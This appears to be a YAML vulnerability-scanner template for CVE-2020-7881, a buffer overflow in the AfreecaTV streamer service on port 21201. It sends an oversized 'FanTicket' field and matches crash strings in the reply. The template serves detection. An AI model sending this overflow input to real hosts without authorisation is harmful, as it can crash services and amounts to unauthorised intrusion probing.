id: CVE-2020-7881

info:
  name: AfreecaTV Streamer Service Buffer Overflow
  author: ProjectDiscoveryAI
  severity: high
  description: |
    AfreecaTV streamer service on port 21201 is vulnerable to a stack-based buffer overflow in the `FanTicket` field due to insufficient validation of input length. This could lead to remote code execution.
  reference:
    - https://www.boho.or.kr/krcert/secNoticeView.do?bulletin_writing_sequence=36357
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.5
    cve-id: CVE-2020-7881
    cwe-id: CWE-190,CWE-787
    epss-score: 0.013
    epss-percentile: 0.78758
    cpe: cpe:2.3:a:afreecatv:afreecatv:1.0.0.1:*:*:*:*:*:*:*
  metadata:
    vendor: afreecatv
    product: afreecatv
  tags: rce, buffer-overflow, afreecatv, cve
tcp:
  - host:
      - "{{Hostname}}"
    port: 21201
    inputs:
      - data: |
          FanTicket: {{rand_text_alphanumeric(500)}}\n
    read-size: 1024
    matchers:
      - type: word
        part: data
        words:
          - "overflow detected"
      - type: dsl
        dsl:
          - contains(data, 'segmentation fault')
    matchers-condition: or